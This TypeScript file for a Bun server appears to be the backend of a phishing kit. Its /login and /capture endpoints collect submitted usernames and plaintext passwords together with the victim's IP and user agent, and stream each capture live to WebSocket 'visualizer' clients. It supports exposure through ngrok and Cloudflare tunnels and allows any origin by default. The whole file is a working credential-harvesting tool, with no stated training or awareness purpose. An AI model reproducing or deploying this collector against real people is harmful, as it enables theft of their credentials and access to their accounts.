import os from 'os'

const port = Number(process.env.PORT ?? 3080)
const bindHost = process.env.BIND_HOST ?? '0.0.0.0'
const visualizerToken = process.env.VISUALIZER_TOKEN
const allowedOrigins = (process.env.ALLOWED_ORIGINS ?? '*')
  .split(',')
  .map((origin) => origin.trim())
  .filter(Boolean)

type CaptureBody = {
  username?: unknown
  password?: unknown
  report?: unknown
}

function stripTrailingSlash(value: string): string {
  return value.replace(/\/+$/, '')
}

function getLocalIP(): string {
  const ifaces = os.networkInterfaces()
  for (const name of Object.keys(ifaces)) {
    for (const iface of ifaces[name] || []) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address
      }
    }
  }
  return '127.0.0.1'
}

function getRequestHost(hostHeader: string | null, localIp: string): string {
  const fallback = `${localIp}:${port}`
  if (!hostHeader) return fallback

  try {
    const url = new URL(`http://${hostHeader}`)
    const hostname = url.hostname.replace(/^\[|\]$/g, '').toLowerCase()
    const hostPort = url.port
    const isLocalhost =
      hostname === 'localhost' ||
      hostname === '127.0.0.1' ||
      hostname === '::1' ||
      hostname === '0.0.0.0'

    if (isLocalhost) {
      return `${localIp}:${hostPort || String(port)}`
    }

    return hostPort ? `${url.hostname}:${hostPort}` : url.hostname
  } catch {
    return fallback
  }
}

function isHttpsRequest(req: Request, host: string): boolean {
  const forwardedProto = req.headers.get('x-forwarded-proto')?.split(',')[0]?.trim()

  return (
    forwardedProto === 'https' ||
    host.includes('trycloudflare.com') ||
    host.includes('ngrok.io') ||
    host.includes('ngrok.app') ||
    host.includes('ngrok-free.app') ||
    process.env.HTTPS === 'true'
  )
}

function isOriginAllowed(origin: string | null): boolean {
  if (!origin) return true
  if (allowedOrigins.includes('*')) return true
  return allowedOrigins.includes(origin)
}

function corsHeaders(origin: string | null): Record<string, string> {
  const allowOrigin = allowedOrigins.includes('*')
    ? '*'
    : origin && allowedOrigins.includes(origin)
      ? origin
      : allowedOrigins[0] ?? ''

  return {
    'Access-Control-Allow-Origin': allowOrigin,
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Vary': 'Origin'
  }
}

function buildServerInfo(req: Request) {
  const ip = getLocalIP()
  const host = getRequestHost(req.headers.get('host'), ip)
  const isHttps = isHttpsRequest(req, host)
  const scheme = isHttps ? 'https' : 'http'
  const wsScheme = isHttps ? 'wss' : 'ws'
  const backendUrl = stripTrailingSlash(
    process.env.PUBLIC_BACKEND_URL ||
    process.env.BACKEND_URL ||
    `${scheme}://${host}`
  )

  let loginUrl = process.env.PUBLIC_LOGIN_URL || process.env.LOGIN_URL || `http://${ip}:3000`
  const wsUrl = stripTrailingSlash(
    process.env.PUBLIC_WS_URL ||
    process.env.WS_URL ||
    `${wsScheme}://${host}/ws`
  )

  try {
    const loginUrlObj = new URL(loginUrl)
    if (!loginUrlObj.searchParams.has('backend')) {
      loginUrlObj.searchParams.set('backend', backendUrl)
    }
    loginUrl = loginUrlObj.toString()
  } catch {
  }

  return {
    ip,
    loginUrl,
    wsUrl,
    backendUrl
  }
}

const clients = new Set<WebSocket>()

const server = Bun.serve({
  hostname: bindHost,
  port,
  async fetch(req, server) {
    const url = new URL(req.url)
    const origin = req.headers.get('origin')
    const headers = corsHeaders(origin)

    if (req.method === 'OPTIONS') {
      return new Response(null, {
        status: isOriginAllowed(origin) ? 204 : 403,
        headers
      })
    }

    if (!isOriginAllowed(origin)) {
      return new Response(JSON.stringify({ success: false, error: 'origin not allowed' }), {
        status: 403,
        headers: { ...headers, 'Content-Type': 'application/json' }
      })
    }

    if ((url.pathname === '/login' || url.pathname === '/capture') && req.method === 'POST') {
      try {
        const body = await req.json() as CaptureBody
        const report = body.report && typeof body.report === 'object' ? body.report : undefined
        const payload = {
          type: 'capture' as const,
          data: {
            username: String(body.username ?? ''),
            password: String(body.password ?? ''),
            timestamp: new Date().toISOString(),
            ip: server.requestIP(req)?.address ?? 'unknown',
            userAgent: req.headers.get('user-agent') ?? 'unknown',
            report
          }
        }
        const message = JSON.stringify(payload)
        for (const ws of clients) {
          try {
            ws.send(message)
          } catch {
            clients.delete(ws)
          }
        }
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...headers, 'Content-Type': 'application/json' }
        })
      } catch {
        return new Response(JSON.stringify({ success: false, error: 'invalid json' }), {
          status: 400,
          headers: { ...headers, 'Content-Type': 'application/json' }
        })
      }
    }

    if (url.pathname === '/ws') {
      if (visualizerToken && url.searchParams.get('token') !== visualizerToken) {
        return new Response('Unauthorized', { status: 401, headers })
      }

      const ok = server.upgrade(req)
      if (ok) return undefined
    }

    if (url.pathname === '/api/server-info') {
      return new Response(JSON.stringify(buildServerInfo(req)), {
        headers: { ...headers, 'Content-Type': 'application/json' }
      })
    }

    if (url.pathname === '/health') {
      return new Response(JSON.stringify({ ok: true }), {
        headers: { ...headers, 'Content-Type': 'application/json' }
      })
    }

    return new Response('Not Found', { status: 404, headers })
  },
  websocket: {
    open(ws) {
      clients.add(ws)
    },
    close(ws) {
      clients.delete(ws)
    },
    message() {}
  }
})

console.log(`Backend running at http://localhost:${server.port}`)
console.log(`LAN backend URL: http://${getLocalIP()}:${server.port}`)
console.log(`WebSocket endpoint: ws://localhost:${server.port}/ws`)
